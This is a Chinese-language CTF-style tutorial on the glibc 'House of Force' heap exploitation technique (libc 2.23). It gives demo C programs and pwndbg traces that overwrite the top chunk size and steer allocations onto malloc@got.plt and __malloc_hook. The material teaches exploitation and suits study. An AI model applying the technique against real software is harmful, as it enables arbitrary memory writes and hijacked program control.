> 参考资料：
>
> CTF-wiki：[https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/)
>
> 附件下载：
>
> 链接: [https://pan.baidu.com/s/1NiEZbuBUCFJrMOjqlazPUA](https://pan.baidu.com/s/1NiEZbuBUCFJrMOjqlazPUA)  密码: np57
>
> --来自百度网盘超级会员V3的分享
>

House Of Force是一种堆的利用方法，其主要原理是控制heap中的top_chunk并malloc来达到控制任意内存的空间。在讲解原理之前，首先来看一个示例。

# Linux环境
![](https://cdn.nlark.com/yuque/0/2020/png/574026/1604996548718-98d3fe7f-6b0a-4943-8e8c-fba3696e8929.png)

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1604996640357-17fb2a11-4916-43a4-8d41-d791cbc58a7f.png)

Ubuntu版本为16.04，libc版本为2.23。

# Demo1
## pwndbg
> 编译命令：gcc -g -z execstack -fno-stack-protector top_chunk_demo.c -o top_chunk_demo
>

```c
#include<stdio.h>
#include<malloc.h>
int main(){
	malloc(0x10);
	malloc(0x20);
	malloc(0x30);
	return 0;
} 
```

编译完成之后检查一下文件的保护：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1604996739742-105e6fb0-694e-4744-8694-fd99c5885550.png)

编译好之后，对其进行gdb调试。对代码的第5行下断点：

```c
➜  Desktop gdb top_chunk_demo
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 192 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from top_chunk_demo...done.
pwndbg> l
1	#include<stdio.h>
2	#include<malloc.h>
3	int main(){
4		malloc(0x10);
5		malloc(0x20);
6		malloc(0x30);
7		return 0;
8	} 
9		
pwndbg> b 5
Breakpoint 1 at 0x400534: file top_chunk_demo.c, line 5.
pwndbg> r
Starting program: /home/ubuntu/Desktop/top_chunk_demo 

Breakpoint 1, main () at top_chunk_demo.c:5
5		malloc(0x20);
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────
 RAX  0x602010 ◂— 0x0
 RBX  0x0
 RCX  0x7ffff7dd1b20 (main_arena) ◂— add    byte ptr [rax], al /* 0x100000000 */
 RDX  0x602010 ◂— 0x0
 RDI  0x7ffff7dd1b20 (main_arena) ◂— add    byte ptr [rax], al /* 0x100000000 */
 RSI  0x602020 ◂— 0x0
 R8   0x602000 ◂— 0x0
 R9   0xd
 R10  0x7ffff7dd1b78 (main_arena+88) —▸ 0x602020 ◂— 0x0
 R11  0x0
 R12  0x400430 (_start) ◂— xor    ebp, ebp
 R13  0x7fffffffdf00 ◂— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffde20 —▸ 0x400550 (__libc_csu_init) ◂— push   r15
 RSP  0x7fffffffde20 —▸ 0x400550 (__libc_csu_init) ◂— push   r15
 RIP  0x400534 (main+14) ◂— mov    edi, 0x20
──────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────
 ► 0x400534 <main+14>              mov    edi, 0x20
   0x400539 <main+19>              call   malloc@plt <malloc@plt>
 
   0x40053e <main+24>              mov    edi, 0x30
   0x400543 <main+29>              call   malloc@plt <malloc@plt>
 
   0x400548 <main+34>              mov    eax, 0
   0x40054d <main+39>              pop    rbp
   0x40054e <main+40>              ret    
 
   0x40054f                        nop    
   0x400550 <__libc_csu_init>      push   r15
   0x400552 <__libc_csu_init+2>    push   r14
   0x400554 <__libc_csu_init+4>    mov    r15d, edi
───────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]───────────────────────────────────────────────────────────────────
In file: /home/ubuntu/Desktop/top_chunk_demo.c
   1 #include<stdio.h>
   2 #include<malloc.h>
   3 int main(){
   4 	malloc(0x10);
 ► 5 	malloc(0x20);
   6 	malloc(0x30);
   7 	return 0;
   8 } 
   9 	
───────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────
00:0000│ rbp rsp  0x7fffffffde20 —▸ 0x400550 (__libc_csu_init) ◂— push   r15
01:0008│          0x7fffffffde28 —▸ 0x7ffff7a2d840 (__libc_start_main+240) ◂— mov    edi, eax
02:0010│          0x7fffffffde30 ◂— 0x1
03:0018│          0x7fffffffde38 —▸ 0x7fffffffdf08 —▸ 0x7fffffffe286 ◂— '/home/ubuntu/Desktop/top_chunk_demo'
04:0020│          0x7fffffffde40 ◂— 0x1f7ffcca0
05:0028│          0x7fffffffde48 —▸ 0x400526 (main) ◂— push   rbp
06:0030│          0x7fffffffde50 ◂— 0x0
07:0038│          0x7fffffffde58 ◂— 0x8c298dcb3123df98
─────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────
 ► f 0           400534 main+14
   f 1     7ffff7a2d840 __libc_start_main+240
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 
```

看一下heap的状况：

```c
pwndbg> heap
Allocated chunk
Addr: 0x602000
Size: 0x00

pwndbg> x/16gx 0x602000
0x602000:	0x0000000000000000	0x0000000000000021 #chunk1
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000020fe1 #top_chunk
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000000000
0x602050:	0x0000000000000000	0x0000000000000000
0x602060:	0x0000000000000000	0x0000000000000000
0x602070:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

这里记下此时top_chunk的大小为0x20fe1。执行同样的步骤，让程序执行malloc(0x20);这时的heap情况如下：

```c
pwndbg> x/16gx 0x602000
0x602000:	0x0000000000000000	0x0000000000000021 #chunk1
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000000031 #chunk2
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000000000
0x602050:	0x0000000000000000	0x0000000000020fb1 #top_chunk
0x602060:	0x0000000000000000	0x0000000000000000
0x602070:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

从上面的代码框可以看到，系统新开辟了一个大小为0x31的内存空间。此时的top_chunk_size减少了0x30大小。

继续调试，让程序执行malloc(0x30);，再来看一下heap：

```c
pwndbg> x/22gx 0x602000
0x602000:	0x0000000000000000	0x0000000000000021 #chunk1
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000000031 #chunk2
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000000000
0x602050:	0x0000000000000000	0x0000000000000041 #chunk3
0x602060:	0x0000000000000000	0x0000000000000000
0x602070:	0x0000000000000000	0x0000000000000000
0x602080:	0x0000000000000000	0x0000000000000000
0x602090:	0x0000000000000000	0x0000000000020f71 #top_chunk
0x6020a0:	0x0000000000000000	0x0000000000000000
pwndbg>
```

此时的top_chunk减小了0x40。

## 结论
从上面可以看出，在分配比top_chunk小的chunk时，会从top_chunk中分割出要分配的chunk，并且top_chunk向下移动。

# 攻击原理
好了，看过了Demo1现在讲解House Of Force原理就应该没有问题了。

如果一个堆漏洞要想通过House Of Force进行利用，那么必须满足以下条件：

+ 能够以溢出等方式控制到top_chunk的size域
+ 能够自由的控制堆分配尺寸的大小

House Of Force产生的原因在于glibc对top_chunk的处理：根据分配堆块的原理我们得知，进行堆分配时，如果所有空闲的块（bin）都无法满足需求，那么就会从 top chunk 中分割出相应的大小作为堆块的空间。

假如说 top_chunk_size 值是由用户控制的任意值时会发生什么？答案是，**<font style="color:#F5222D;">可以使得 top chunk 指向我们期望的任何位置</font>**，这就相当于一次任意地址写。

然而在 glibc 中，会对用户请求的大小和 top chunk 现有的 size 进行验证：

```c
#libc-2.23中malloc源码第3793-3809行
	  victim = av->top;//获取当前top_chunk
      size = chunksize (victim);//计算top_chunk的大小
	  如果在分割之后，其大小仍然满足chunk的最小大小，那么就可以直接进行分割。
      if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE))
        {
          remainder_size = size - nb;
          remainder = chunk_at_offset (victim, nb);
          av->top = remainder;//top_chunk指针更新
-------------------------------------------------------------------------------
chunk_at_offset (victim, nb)的宏定义（代码第1312-1313行）
/* Treat space at ptr + offset as a chunk */
#define chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))
-------------------------------------------------------------------------------
          set_head (victim, nb | PREV_INUSE |
                    (av != &main_arena ? NON_MAIN_ARENA : 0));
          set_head (remainder, remainder_size | PREV_INUSE);//更新top_chunk_size

          check_malloced_chunk (av, victim, nb);
          void *p = chunk2mem (victim);
          alloc_perturb (p, bytes);
          return p;
        }
```

根据上面的源码知道，假如说top_chunk_size被篡改成很大的值，就可以很轻松的通过这个验证，这也就是前面我们所说的需要一个能够控制top_chunk_size的漏洞。若要绕过这个验证，一般的做法是将top_chunk_size改为-1，因为在进行比较的时候会将size转换为无符号数。进一步来说就是将-1转换为unsigned long中最大的数，所以无论如何可以通过验证。验证通过之后，会将top_chunk指针进行更新，接下来的堆块就会分配到这个位置。用户只要控制了这个指针就相当于控制了任意地址。与此同时，top_chunk的size也会更新。

> 总结一下：如果我们想要下次在指定位置分配大小为 x 的 chunk，我们需要确保 remainder_size 不小于 x+ MINSIZE。
>

# 向前控制内存-Demo2
在学习完原理之后，我们通过一个简单的示例来进一步说明House Of Force的利用。

> 这个例子的目标是通过HOF（House Of Force）来篡改malloc@got.plt 实现劫持程序流程。
>
> Demo2和之后的Demo3都会出现在我的电脑上gdb调试不出错，但是直接运行程序就会崩溃的情况，暂不清楚导致这种情况的原因。
>

示例的源代码如下：

> gcc -g -z execstack -fno-stack-protector top_chunk_demo1.c -o top_chunk_demo1
>

```c
#include<stdio.h>
int main()
{
    long *ptr,*ptr2;
    ptr=malloc(0x10);
    ptr=(long *)(((long)ptr)+24);
    *ptr=-1;        // <=== 这里把top chunk的size域改为0xffffffffffffffff
    malloc(-4120);  // <=== 减小top chunk指针
    malloc(0x10);   // <=== 分配块实现任意地址写
    return 0;
}
```

和上面的调试步骤相同，对代码的第6行下断点，然后运行程序，查看堆的情况：

```c
pwndbg> x/16gx 0x602000
0x602000:	0x0000000000000000	0x0000000000000021 #chunk1
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000020fe1 #top_chunk
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000000000
0x602050:	0x0000000000000000	0x0000000000000000
0x602060:	0x0000000000000000	0x0000000000000000
0x602070:	0x0000000000000000	0x0000000000000000
pwndbg> info local
ptr = 0x602010
pwndbg> 
```

对程序第7行下断点，让程序运行ptr=(long *)(((long)ptr)+24);

```c
pwndbg> x/16gx 0x602000
0x602000:	0x0000000000000000	0x0000000000000021 #chunk1
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000020fe1 #top_chunk
								#ptr
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000000000
0x602050:	0x0000000000000000	0x0000000000000000
0x602060:	0x0000000000000000	0x0000000000000000
0x602070:	0x0000000000000000	0x0000000000000000
pwndbg> info local
ptr = 0x602028
pwndbg> 
```

相同的步骤，让程序继续执行*ptr=-1;：

```c
pwndbg> x/16gx 0x602000
0x602000:	0x0000000000000000	0x0000000000000021 #chunk1
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0xffffffffffffffff #top_chunk
								#ptr
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000000000
0x602050:	0x0000000000000000	0x0000000000000000
0x602060:	0x0000000000000000	0x0000000000000000
0x602070:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

从上面的代码框中可以看出top_chunk_size已经被改成了0xffffffffffffffff，在真正的题目中，这一步可以通过堆溢出等漏洞来实现。 因为 -1 在补码中是以 0xffffffffffffffff 表示的，所以我们直接赋值 -1 就可以。

还记得我们的目标吗？通过HOF（House Of Force）来篡改malloc@got.plt 实现劫持程序流程。

接下来程序就开始执行malloc(-4120);了，有个疑问，-4120这个数字是怎么来的？

由于我们的目标是malloc@got.plt，因此将程序拖入IDA中：

![](https://cdn.nlark.com/yuque/0/2020/png/574026/1605015661033-f8aba608-ba19-4040-8430-7ff57c77784e.png)

从IDA中可以看到malloc@got.plt所在的地址为0x601020:

```c
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
          0x400000           0x401000 r-xp     1000 0      /home/ubuntu/Desktop/top_chunk_demo1
          0x600000           0x601000 r-xp     1000 0      /home/ubuntu/Desktop/top_chunk_demo1
          0x601000           0x602000 rwxp     1000 1000   /home/ubuntu/Desktop/top_chunk_demo1
          0x602000           0x623000 rwxp    21000 0      [heap]
    0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so
    0x7ffff7bcd000     0x7ffff7dcd000 ---p   200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
    0x7ffff7dcd000     0x7ffff7dd1000 r-xp     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
    0x7ffff7dd1000     0x7ffff7dd3000 rwxp     2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so
    0x7ffff7dd3000     0x7ffff7dd7000 rwxp     4000 0      
    0x7ffff7dd7000     0x7ffff7dfd000 r-xp    26000 0      /lib/x86_64-linux-gnu/ld-2.23.so
    0x7ffff7fd9000     0x7ffff7fdc000 rwxp     3000 0      
    0x7ffff7ff7000     0x7ffff7ffa000 r--p     3000 0      [vvar]
    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000 0      [vdso]
    0x7ffff7ffc000     0x7ffff7ffd000 r-xp     1000 25000  /lib/x86_64-linux-gnu/ld-2.23.so
    0x7ffff7ffd000     0x7ffff7ffe000 rwxp     1000 26000  /lib/x86_64-linux-gnu/ld-2.23.so
    0x7ffff7ffe000     0x7ffff7fff000 rwxp     1000 0      
    0x7ffffffde000     0x7ffffffff000 rwxp    21000 0      [stack]
0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]
pwndbg> x/16gx 0x601020
0x601020:	0x00007ffff7a91180	0x0000000000000000
    		#malloc@got.plt
0x601030:	0x0000000000000000	0x0000000000000000
0x601040:	0x0000000000000000	0x0000000000000000
0x601050:	0x0000000000000000	0x0000000000000000
0x601060:	0x0000000000000000	0x0000000000000000
0x601070:	0x0000000000000000	0x0000000000000000
0x601080:	0x0000000000000000	0x0000000000000000
0x601090:	0x0000000000000000	0x0000000000000000
pwndbg> x/16gx 0x00007ffff7a91180
0x7ffff7a91180 <__GI___libc_malloc>:	0x8b4808ec83485355	0x008b480033fd6305
0x7ffff7a91190 <__GI___libc_malloc+16>:	0x00014f850fc08548	0x0033fbf0058b4800
0x7ffff7a911a0 <__GI___libc_malloc+32>:	0x48188b4864fd8948	0x8304438b0c74db85
0x7ffff7a911b0 <__GI___libc_malloc+48>:	0x00000098840f04e0	0xc08548ffff9453e8
0x7ffff7a911c0 <__GI___libc_malloc+64>:	0x0000c7840fc38948	0xe8df8948ee894800
0x7ffff7a911d0 <__GI___libc_malloc+80>:	0x48c08548ffffd9bc	0x000000d8840fc289
0x7ffff7a911e0 <__GI___libc_malloc+96>:	0x7400003455593d83	0x1aeb06750bfff007
0x7ffff7a911f0 <__GI___libc_malloc+112>:	0x483b8d4816740bff	0x6de800000080ec81
pwndbg> 
```

所以我们应该将 top_chunk 指向0x601010处，这样当下次再分配chunk时，就可以分配到malloc@got.plt处的内存了。

根据前面描述top_chunk位于0x602020，所以我们可以计算偏移0x601010-0x602020=-4112。

此外，用户申请的内存大小，一旦进入申请内存的函数中就变成了**<font style="color:#F5222D;">无符号整数：</font>**

```c
void *__libc_malloc(size_t bytes) {
    ......
}
```

输入的大小后需要经过checked_request2size函数：

```c
/*
   Check if a request is so large that it would wrap around zero when
   padded and aligned. To simplify some other code, the bound is made
   low enough so that adding MINSIZE will also not wrap around zero.
 */

#define REQUEST_OUT_OF_RANGE(req)                                 \
  ((unsigned long) (req) >=						      \
   (unsigned long) (INTERNAL_SIZE_T) (-2 * MINSIZE))

/* pad request bytes into a usable size -- internal version */

#define request2size(req)                                         \
  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE)  ?             \
   MINSIZE :                                                      \
   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK)

/*  Same, except also perform argument check */

#define checked_request2size(req, sz)                             \
  if (REQUEST_OUT_OF_RANGE (req)) {					      \
      __set_errno (ENOMEM);						      \
      return 0;								      \
    }									      \
  (sz) = request2size (req);
```

一方面，我们需要绕过 REQUEST_OUT_OF_RANGE(req) 这个检测，即**<font style="color:#F5222D;">我们传给 malloc 的值在负数范围内，不得大于 -2 * MINSIZE</font>**，这个一般情况下都是可以满足的。

另一方面，在满足对应的约束后，我们需要**<font style="color:#F5222D;">使得 request2size正好转换为对应的大小</font>**，也就是说，我们需要使得 **<font style="color:#F5222D;">((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK </font>**恰好为 - 4112。**首先，很显然，-4112 是 chunk 对齐的，那么我们只需要将其减去 SIZE_SZ和MALLOC_ALIGN_MASK 就可以得到对应的需要申请的值。其实我们这里只需要减 SIZE_SZ 就可以了，因为多减的 MALLOC_ALIGN_MASK 最后还会被对齐掉。而如果 -4112 不是 MALLOC_ALIGN 的时候，我们就需要多减一些了。当然，我们最好使得分配之后得到的 chunk 也是对齐的，因为在释放一个 chunk 的时候，会进行对齐检查。**

> **32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8**。
>
> malloc(-4112-SIZE_SZ)=malloc(-4112-8)=malloc(-4120)。
>

因此，我们当调用`malloc(-4120)`之后，我们可以观察到 top chunk 被抬高到我们想要的位置。

对代码的第9行下断点，执行代码malloc(-4120);：

```c
-----------------------------
#执行malloc(-4120)前;
pwndbg> top_chunk
Top chunk
Addr: 0x602020
Size: 0x00（这里显示的不准确）
pwndbg> 
-----------------------------
#执行malloc(-4120)后;
pwndbg> top_chunk
Top chunk
Addr: 0x601010
Size: 0x7ffff7deef10
pwndbg> 
-----------------------------
```

```c
pwndbg> x/16gx 0x601000
0x601000:	0x0000000000600e28	0x00007ffff7ffe168
0x601010:	0x00007ffff7deef10	0x0000000000001009 #top_chunk
0x601020:	0x00007ffff7a91180	0x0000000000000000
    		#malloc@got.plt
0x601030:	0x0000000000000000	0x0000000000000000
0x601040:	0x0000000000000000	0x0000000000000000
0x601050:	0x0000000000000000	0x0000000000000000
0x601060:	0x0000000000000000	0x0000000000000000
0x601070:	0x0000000000000000	0x0000000000000000
pwndbg> x/16gx  &main_arena
0x7ffff7dd1b20 <main_arena>:	0x0000000100000000	0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>:	0x0000000000000000	0x0000000000601010 #top_chunk
0x7ffff7dd1b80 <main_arena+96>:	0x0000000000000000	0x00007ffff7dd1b78
0x7ffff7dd1b90 <main_arena+112>:	0x00007ffff7dd1b78	0x00007ffff7dd1b88
pwndbg> 
```

最后程序malloc(0x10);之后，就可以控制malloc@got.plt处的地址：

```c
pwndbg> x/16gx 0x601000
0x601000:	0x0000000000600e28	0x00007ffff7ffe168
0x601010:	0x00007ffff7deef10	0x0000000000000021 #new_malloc_chunk
								#malloc之后被修改的地方
0x601020:	0x00007ffff7a91180	0x0000000000000000
    		#malloc@got.plt
0x601030:	0x0000000000000000	0x0000000000000fe9 #top_chunk
0x601040:	0x0000000000000000	0x0000000000000000
0x601050:	0x0000000000000000	0x0000000000000000
0x601060:	0x0000000000000000	0x0000000000000000
0x601070:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

但是需要注意的是，在被抬高的同时，malloc@got 附近的内容也会被修改。

```c
          set_head (victim, nb | PREV_INUSE |
                    (av != &main_arena ? NON_MAIN_ARENA : 0));
//在之前的篇幅中，你见过这个代码
```

# 向后控制内存-Demo3
在上一个示例中，我们演示了篡改top_chunk使得top_chunk指针减小来修改位于其上面 (低地址) 的 got 表中的内容。同样的，利用此方式可以修改其下面（高地址）的内容。这次同样的利用代码进行演示：

> 编译命令：gcc -g -z execstack -fno-stack-protector top_chunk_demo2.c -o top_chunk_demo2
>

```c
#include<stdio.h>
int main()
{
    long *ptr,*ptr2;
    ptr=malloc(0x10);
    ptr=(long *)(((long)ptr)+24);
    *ptr=-1;                 //<=== 修改top chunk size
    malloc(140737345551056); //<=== 增大top chunk指针
    malloc(0x10);
    return 0;
}
```

编译完成之后，开始对其进行调试，对代码的第6行下断点，看一下堆的情况：

```c
pwndbg> info local
ptr = 0x602010
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x602000
Size: 0x21

Top chunk | PREV_INUSE
Addr: 0x602020
Size: 0x20fe1

pwndbg> x/16gx 0x602000
0x602000:	0x0000000000000000	0x0000000000000021 #chunk1
0x602010:	0x0000000000000000	0x0000000000000000
    		#ptr
0x602020:	0x0000000000000000	0x0000000000020fe1 #top_chunk
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000000000
0x602050:	0x0000000000000000	0x0000000000000000
0x602060:	0x0000000000000000	0x0000000000000000
0x602070:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

对代码的第7行下断点，继续运行程序，再来看一下堆的情况：

```c
pwndbg> info local
ptr = 0x602028
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x602000
Size: 0x21

Top chunk | PREV_INUSE
Addr: 0x602020
Size: 0x20fe1

pwndbg> x/16gx 0x602000
0x602000:	0x0000000000000000	0x0000000000000021 #chunk1
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0x0000000000020fe1 #top_chunk
								#ptr
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000000000
0x602050:	0x0000000000000000	0x0000000000000000
0x602060:	0x0000000000000000	0x0000000000000000
0x602070:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

```c
pwndbg> info local
ptr = 0x602028
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x602000
Size: 0x21

Allocated chunk | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENA
Addr: 0x602020
Size: 0x-1

pwndbg> x/16gx 0x602000
0x602000:	0x0000000000000000	0x0000000000000021 chunk1
0x602010:	0x0000000000000000	0x0000000000000000
0x602020:	0x0000000000000000	0xffffffffffffffff #top_chunk
								#ptr
0x602030:	0x0000000000000000	0x0000000000000000
0x602040:	0x0000000000000000	0x0000000000000000
0x602050:	0x0000000000000000	0x0000000000000000
0x602060:	0x0000000000000000	0x0000000000000000
0x602070:	0x0000000000000000	0x0000000000000000
pwndbg> 
```

从上面可以看到top_chunk的size域已经被修改，让程序继续执行malloc(140737345551056);

为什么是malloc这么一长串数字？

这次我们的目标是__malloc_hook，我们知道__malloc_hook 是位于 libc.so 里的全局变量值，首先查看内存布局:

```c
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
          0x400000           0x401000 r-xp     1000 0      /home/ubuntu/Desktop/top_chunk_demo2
          0x600000           0x601000 r-xp     1000 0      /home/ubuntu/Desktop/top_chunk_demo2
          0x601000           0x602000 rwxp     1000 1000   /home/ubuntu/Desktop/top_chunk_demo2
          0x602000           0x623000 rwxp    21000 0      [heap]
    0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so
    0x7ffff7bcd000     0x7ffff7dcd000 ---p   200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
    0x7ffff7dcd000     0x7ffff7dd1000 r-xp     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
    0x7ffff7dd1000     0x7ffff7dd3000 rwxp     2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so
    0x7ffff7dd3000     0x7ffff7dd7000 rwxp     4000 0      
    0x7ffff7dd7000     0x7ffff7dfd000 r-xp    26000 0      /lib/x86_64-linux-gnu/ld-2.23.so
    0x7ffff7fd9000     0x7ffff7fdc000 rwxp     3000 0      
    0x7ffff7ff7000     0x7ffff7ffa000 r--p     3000 0      [vvar]
    0x7ffff7ffa000     0x7ffff7ffc000 r-xp     2000 0      [vdso]
    0x7ffff7ffc000     0x7ffff7ffd000 r-xp     1000 25000  /lib/x86_64-linux-gnu/ld-2.23.so
    0x7ffff7ffd000     0x7ffff7ffe000 rwxp     1000 26000  /lib/x86_64-linux-gnu/ld-2.23.so
    0x7ffff7ffe000     0x7ffff7fff000 rwxp     1000 0      
    0x7ffffffde000     0x7ffffffff000 rwxp    21000 0      [stack]
0xffffffffff600000 0xffffffffff601000 r-xp     1000 0      [vsyscall]
pwndbg> 
```

可以看到heap的基址在0x602000，而libc的基址在0x7ffff7a0d000，因此我们需要通过HOF扩大top_chunk指针的值来实现对__malloc_hook的写。 首先，由pwndbg得知 __malloc_hook 的地址位于 0x7ffff7dd1b10 :

```c
pwndbg> x/16gx &__malloc_hook
0x7ffff7dd1b10 <__malloc_hook>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b20 <main_arena>:	0x0000000100000000	0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>:	0x0000000000000000	0x0000000000602020
0x7ffff7dd1b80 <main_arena+96>:	0x0000000000000000	0x00007ffff7dd1b78
pwndbg>
```

采取计算0x7ffff7dd1b00-0x602020-**0x10**=140737345551056 

经过这次 malloc 之后，我们可以观察到 top_chunk 的地址被抬高到了 0x00007ffff7dd1b00：

```c
pwndbg> info local
ptr = 0x602028
pwndbg> heap
Allocated chunk
Addr: 0x7ffff7dd1000
Size: 0x7ffff7fdb000

pwndbg> top_chunk
Top chunk
Addr: 0x7ffff7dd1b00
Size: 0x-7ffff77cfae7
pwndbg> x/16gx &main_arena
0x7ffff7dd1b20 <main_arena>:	0x0000000100000000	0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>:	0x0000000000000000	0x00007ffff7dd1b00 #top_chunk
0x7ffff7dd1b80 <main_arena+96>:	0x0000000000000000	0x00007ffff7dd1b78
0x7ffff7dd1b90 <main_arena+112>:	0x00007ffff7dd1b78	0x00007ffff7dd1b88
pwndbg> x/16gx 0x7ffff7dd1b00
0x7ffff7dd1b00 <__memalign_hook>:	0x00007ffff7a92ea0	0xffff800008830519
0x7ffff7dd1b10 <__malloc_hook>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b20 <main_arena>:	0x0000000100000000	0x0000000000000000
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>:	0x0000000000000000	0x00007ffff7dd1b00 #top_chunk
pwndbg> 
```

之后，我们只要再次分配就可以控制 0x7ffff7dd1b10 处的 __malloc_hook 值了：

```c
pwndbg> heap
Allocated chunk
Addr: 0x7ffff7dd1000
Size: 0x7ffff7fdb000

pwndbg> top_chunk
Top chunk
Addr: 0x7ffff7dd1b20
Size: 0x-7ffff77cfb07
pwndbg> x/20gx 0x7ffff7dd1b00
0x7ffff7dd1b00 <__memalign_hook>:	0x00007ffff7a92ea0	0x0000000000000021#new_chunk
0x7ffff7dd1b10 <__malloc_hook>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b20 <main_arena>:	0x0000000100000000	0xffff8000088304f9 #top_chunk
0x7ffff7dd1b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b50 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b60 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7ffff7dd1b70 <main_arena+80>:	0x0000000000000000	0x00007ffff7dd1b20 #指向top_chunk
